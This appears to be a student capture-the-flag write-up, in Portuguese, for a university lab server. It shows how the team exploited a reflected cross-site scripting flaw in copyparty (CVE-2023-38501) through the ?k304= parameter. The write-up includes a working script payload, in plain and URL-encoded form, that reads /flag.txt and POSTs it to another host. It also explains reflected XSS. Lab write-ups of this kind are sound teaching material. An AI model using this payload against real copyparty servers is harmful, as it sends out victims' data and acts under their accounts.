# CTF Semana #7 (XSS)

## Tarefas

> Começamos por explorar o servidor, navegando como um utilizador normal, e rapidamente reparamos num ficheiro ***flag.txt***. Ao abrir este percebemos que não conseguiamos aceder diretamente à flag secreta, pois esta enconta-se protegida e será necessário a execução de um script de JavaScript para conseguirmos ter acesso a esta.

![flag.txt](CTF7/flagtxt.png)

> Decidimos pesquisar sobre este problema, na esperança de encontrar vulnerabilidades documentadas que se pudessem aplicar e ser exporadas neste servidor. Neste sentido encontramos o *CVE-2023-38501*:
>> "copyparty is file server software. Prior to version 1.8.7, the application contains a reflected cross-site scripting via URL-parameter `?k304=...` and `?setck=...`. The worst-case outcome of this is being able to move or delete existing files on the server, or upload new files, using the account of the person who clicks the malicious link."


> Assim, ajustámos o código para executar o exploit. O nosso objetivo será correr o seguinte script:

```
http://ctf-fsi.fe.up.pt:5007/?k304=y

<script>
     fetch('/flag.txt')
         .then(r => r.text())
         .then(flag => fetch('http://[::]:8000', { method: 'POST', body: flag }));
</script>
```

> Codificando este código de forma a obter um URL para utilizarmos, ficamos com o seguinte URL: 
http://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cscript%3Efetch(%27%2Fflag.txt%27)%0A%20%20.then(r%20%3D%3E%20r.text())%0A%20%20.then(flag%20%3D%3E%20fetch(%27http%3A%2F%2F%5B%3A%3A%5D%3A8000%27%2C%20%7B%20method%3A%20%27POST%27%2C%20body%3A%20flag%20%7D))%3C%2Fscript%3E

> Inserindo este URL encontramos a nossa flag, ao verificar o tráfego de rede usando Developer Tools.

![flag encontrada](CTF7/flag.png)

> Neste desafio, o tipo de vulnerabilidade de XSS que nos permitiu aceder à flag foi Reflected XSS. Esta vulnerabilidade ocorre quando os dados inseridos pelo utilizador, como parâmetros na URL ou campos de input, são imediatamente refletidos na resposta do servidor sem a devida validação. Neste caso, conseguimos injetar código JavaScript malicioso que foi executado no contexto da página, permitindo realizar um fetch ao *flag.txt* e obter o seu conteúdo.

